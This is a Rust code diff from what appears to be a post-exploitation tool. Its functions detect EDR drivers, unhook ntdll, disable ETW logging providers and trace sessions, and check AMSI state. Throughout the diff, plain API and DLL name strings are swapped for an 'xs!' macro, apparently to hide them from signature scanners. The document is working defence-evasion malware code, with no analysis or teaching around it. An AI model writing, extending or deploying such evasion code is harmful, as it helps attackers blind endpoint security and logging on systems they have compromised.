@@ -753,8 +753,9 @@ fn detect_edr_drivers_impl() -> Vec<String> {
         type NtQuerySystemInformation =
             unsafe extern "system" fn(u32, *mut std::ffi::c_void, u32, *mut u32) -> i32;
 
-        let ntdll =
-            windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::s!("ntdll.dll"));
+        let ntdll = windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+        ));
         let ntdll = match ntdll {
             Ok(m) => m,
             Err(_) => return found,
@@ -763,7 +764,7 @@ fn detect_edr_drivers_impl() -> Vec<String> {
         let ntqsi: Option<NtQuerySystemInformation> = {
             let ptr = windows::Win32::System::LibraryLoader::GetProcAddress(
                 ntdll,
-                windows::core::s!("NtQuerySystemInformation"),
+                windows::core::PCSTR(crate::xs!("NtQuerySystemInformation").as_bytes().as_ptr()),
             );
             ptr.map(|p| std::mem::transmute::<_, NtQuerySystemInformation>(p))
         };
@@ -876,8 +877,10 @@ fn scan_ntdll_hooks_impl() -> Result<Vec<HookDetection>> {
     let mut detections = Vec::new();
 
     unsafe {
-        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll"))
-            .map_err(|e| OverthroneError::PostExploitation(format!("GetModuleHandleA: {e}")))?;
+        let ntdll = GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+        ))
+        .map_err(|e| OverthroneError::PostExploitation(format!("GetModuleHandleA: {e}")))?;
         let ntdll_base = ntdll.0 as usize;
 
         // Get the current syscall numbers from the loaded (possibly hooked) ntdll
@@ -1042,7 +1045,9 @@ fn unhook_ntdll_impl() -> Result<UnhookResult> {
     };
 
     unsafe {
-        let ntdll = match GetModuleHandleA(windows::core::s!("ntdll.dll")) {
+        let ntdll = match GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+        )) {
             Ok(m) => m,
             Err(e) => {
                 result.errors.push(format!("GetModuleHandleA: {e}"));
@@ -1159,7 +1164,7 @@ fn unhook_ntdll_impl() -> Result<UnhookResult> {
                 ) -> i32;
                 if let Some(flush_addr) = windows::Win32::System::LibraryLoader::GetProcAddress(
                     ntdll,
-                    windows::core::s!("NtFlushInstructionCache"),
+                    windows::core::PCSTR(crate::xs!("NtFlushInstructionCache").as_bytes().as_ptr()),
                 ) {
                     let nt_flush: NtFlushInstructionCache = std::mem::transmute(flush_addr);
                     nt_flush(std::ptr::null_mut(), current_addr as *const _, size);
@@ -1284,14 +1289,15 @@ fn abolish_etw_providers_impl() -> Result<EtwAbolitionResult> {
             *mut u32,
         ) -> i32;
 
-        let ntdll =
-            windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::s!("ntdll.dll"))
-                .map_err(|e| OverthroneError::PostExploitation(format!("GetModuleHandleA: {e}")))?;
+        let ntdll = windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+        ))
+        .map_err(|e| OverthroneError::PostExploitation(format!("GetModuleHandleA: {e}")))?;
 
         let ntqip = {
             let ptr = windows::Win32::System::LibraryLoader::GetProcAddress(
                 ntdll,
-                windows::core::s!("NtQueryInformationProcess"),
+                windows::core::PCSTR(crate::xs!("NtQueryInformationProcess").as_bytes().as_ptr()),
             );
             ptr.ok_or_else(|| {
                 OverthroneError::PostExploitation(
@@ -1421,7 +1427,7 @@ fn disable_etw_trace_sessions() -> usize {
             unsafe extern "system" fn(u32, *mut std::ffi::c_void, u32, *mut u32) -> i32;
 
         let ntdll = match windows::Win32::System::LibraryLoader::GetModuleHandleA(
-            windows::core::s!("ntdll.dll"),
+            windows::core::PCSTR(crate::xs!("ntdll.dll").as_bytes().as_ptr()),
         ) {
             Ok(m) => m,
             Err(_) => return 0,
@@ -1429,7 +1435,7 @@ fn disable_etw_trace_sessions() -> usize {
 
         let ntqsi = windows::Win32::System::LibraryLoader::GetProcAddress(
             ntdll,
-            windows::core::s!("NtQuerySystemInformation"),
+            windows::core::PCSTR(crate::xs!("NtQuerySystemInformation").as_bytes().as_ptr()),
         );
         let ntqsi = match ntqsi {
             Some(p) => std::mem::transmute::<
@@ -1467,7 +1473,7 @@ fn disable_etw_trace_sessions() -> usize {
 
         let ntct = windows::Win32::System::LibraryLoader::GetProcAddress(
             ntdll,
-            windows::core::s!("NtControlTrace"),
+            windows::core::PCSTR(crate::xs!("NtControlTrace").as_bytes().as_ptr()),
         );
         let ntct = match ntct {
             Some(p) => {
@@ -1530,15 +1536,24 @@ fn disable_etw_trace_sessions() -> usize {
 fn check_etw_amsi_state() -> (bool, bool) {
     let etw_active = unsafe {
         use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-        match GetModuleHandleA(windows::core::s!("ntdll.dll")) {
-            Ok(m) => GetProcAddress(m, windows::core::s!("EtwEventWrite")).is_some(),
+        match GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+        )) {
+            Ok(m) => GetProcAddress(
+                m,
+                windows::core::PCSTR(crate::xs!("EtwEventWrite").as_bytes().as_ptr()),
+            )
+            .is_some(),
             Err(_) => false,
         }
     };
 
     let amsi_loaded = unsafe {
         use windows::Win32::System::LibraryLoader::GetModuleHandleA;
-        GetModuleHandleA(windows::core::s!("amsi.dll")).is_ok()
+        GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("amsi.dll").as_bytes().as_ptr(),
+        ))
+        .is_ok()
     };
 
     (etw_active, amsi_loaded)
